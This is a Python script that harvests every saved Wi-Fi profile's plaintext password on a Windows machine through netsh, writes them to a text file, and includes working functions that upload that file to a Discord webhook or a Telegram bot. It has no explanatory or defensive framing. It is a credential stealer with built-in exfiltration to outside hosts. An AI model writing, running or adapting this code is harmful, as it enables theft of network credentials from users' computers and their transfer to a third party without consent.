import subprocess
import os
import requests
from dotenv import load_dotenv
from pathlib import Path

# Load environment variables
dotenv_path = Path('env/.env')
load_dotenv(dotenv_path=dotenv_path)
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# File path to save Wi-Fi passwords
wifi_passwords_file = "wifi_passwords.txt"

def wifi_profiles_and_passwords():
    try:
        with open(wifi_passwords_file, 'w', encoding='utf-8') as file:
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
            profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
            for profile in profiles:
                try:
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
                    password = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                    file.write(f"Profile: {profile}\n")
                    if password:
                        file.write(f"Password: {password[0]}\n")
                    else:
                        file.write("Password: Not found\n")
                    file.write("-" * 50 + "\n")
                except subprocess.CalledProcessError:
                    file.write(f"Profile: {profile}\nPassword: ENCODING ERROR\n")
                    file.write("-" * 50 + "\n")
        print(f"Wi-Fi profiles and passwords saved to {wifi_passwords_file}")
    except Exception as e:
        print(f"Error: {e}")

def send_wifi_file_to_discord(wifi_passwords_file, file_description):
    try:
        with open(wifi_passwords_file, 'rb') as file:
            files = {
                'file': (os.path.basename(wifi_passwords_file), file)
            }
            payload = {
                'content': file_description,
                'username': 'Wi-Fi Info Sender'
            }
            response = requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
            if response.status_code == 204:
                print(f"File {wifi_passwords_file} successfully sent to Discord")
            else:
                print(f"Failed to send file {wifi_passwords_file} to Discord: {response.status_code}")
    except Exception as e:
        print(f"Error sending file to Discord: {e}")

def send_wifi_file_to_telegram(wifi_passwords_file, file_description):
    try:
        with open(wifi_passwords_file, 'rb') as file:
            response = requests.post(
                f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument',
                data={'chat_id': TELEGRAM_CHAT_ID, 'caption': file_description},
                files={'document': file}
            )
            if response.status_code == 200:
                print(f"File {wifi_passwords_file} successfully sent to Telegram")
            else:
                print(f"Failed to send file {wifi_passwords_file} to Telegram: {response.status_code}")
    except Exception as e:
        print(f"Error sending file to Telegram: {e}")

if __name__ == "__main__":
    wifi_profiles_and_passwords()
